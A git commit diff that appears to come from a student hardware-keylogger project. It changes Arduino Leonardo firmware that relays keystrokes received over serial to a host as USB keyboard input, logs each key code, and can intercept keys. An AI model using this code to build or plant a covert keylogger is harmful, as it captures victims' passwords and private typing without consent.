c794f9e6b3b61ed6a5d0918061fd28eeb8208557
Jannate ALQARH <jannate@optiplex-1519.cri15.ensi-bourges.fr>
2024-01-26 17:25:40 +0100

    jannate.alqarh@insa-cvl.fr: update du code leonardo passage en qwerty et changement du keymap pour ne plus avoir de caractere UFT-8 et regler les probleme

--- keylogger/src/leonardo_board_code/leonardo_board_code.ino
+++ keylogger/src/leonardo_board_code/leonardo_board_code.ino
@@ -7,7 +7,7 @@ void setup() {
   Serial.begin(115200);
   Serial1.begin(115200);
   Serial1.setTimeout(50);
-  Keyboard.begin(KeyboardLayout_fr_FR);
+  Keyboard.begin(KeyboardLayout_en_US);
 }
 
 void loop() {
@@ -17,7 +17,7 @@ void loop() {
     Serial1.readBytes((char*)&key, sizeof(struct send_char_t));
 
     if (!intercept) {
-      processKey(key);
+      processKey(&key);
       Serial.println((int)key.ch);
       Serial.println((int)key.mod);
       Serial.println((int)key.buf);
@@ -29,16 +29,22 @@ void loop() {
   }
 }
 
-void processKey(struct send_char_t key) {
+void processKey(struct send_char_t *key) {
 
-  if( (key.mod & LEFT_CTRL ) == LEFT_CTRL  || (key.mod & RIGHT_CTRL ) == RIGHT_CTRL ) Keyboard.press(KEY_LEFT_CTRL);
-  if( (key.mod & LEFT_SHIFT) == LEFT_SHIFT || (key.mod & RIGHT_SHIFT) == RIGHT_SHIFT) Keyboard.press(KEY_LEFT_SHIFT);
-  if( (key.mod & LEFT_CMD  ) == LEFT_CMD   || (key.mod & RIGHT_CMD  ) == RIGHT_CMD  ) Keyboard.press(KEY_HOME);
-  if( (key.mod & ALT       ) == ALT                                                 ) Keyboard.press(KEY_LEFT_ALT);
-  if( (key.mod & ALT_GR    ) == ALT_GR                                              ) Keyboard.press(KEY_RIGHT_ALT);
+  if( (key->mod & LEFT_CTRL ) == LEFT_CTRL  || (key->mod & RIGHT_CTRL ) == RIGHT_CTRL ) Keyboard.press(KEY_LEFT_CTRL);
+  if( (key->mod & LEFT_SHIFT) == LEFT_SHIFT || (key->mod & RIGHT_SHIFT) == RIGHT_SHIFT) Keyboard.press(KEY_LEFT_SHIFT);
+  if( (key->mod & LEFT_CMD  ) == LEFT_CMD   || (key->mod & RIGHT_CMD  ) == RIGHT_CMD  ) Keyboard.press(KEY_HOME);
+  if( (key->mod & ALT       ) == ALT                                                  ) Keyboard.press(KEY_LEFT_ALT);
+  if( (key->mod & ALT_GR    ) == ALT_GR                                               ) Keyboard.press(KEY_RIGHT_ALT);
 
-  Keyboard.write(keymaps[key.ch], sizeof(char)*strlen(keymaps[key.ch]));
+  Keyboard.press(keymaps[key->ch]);
+  delay(50);
+  Keyboard.release(keymaps[key->ch]);
 
-  Keyboard.releaseAll();
+  if( (key->mod & LEFT_CTRL ) == LEFT_CTRL  || (key->mod & RIGHT_CTRL ) == RIGHT_CTRL ) Keyboard.release(KEY_LEFT_CTRL);
+  if( (key->mod & LEFT_SHIFT) == LEFT_SHIFT || (key->mod & RIGHT_SHIFT) == RIGHT_SHIFT) Keyboard.release(KEY_LEFT_SHIFT);
+  if( (key->mod & LEFT_CMD  ) == LEFT_CMD   || (key->mod & RIGHT_CMD  ) == RIGHT_CMD  ) Keyboard.release(KEY_HOME);
+  if( (key->mod & ALT       ) == ALT                                                  ) Keyboard.release(KEY_LEFT_ALT);
+  if( (key->mod & ALT_GR    ) == ALT_GR                                               ) Keyboard.release(KEY_RIGHT_ALT);
 
 }
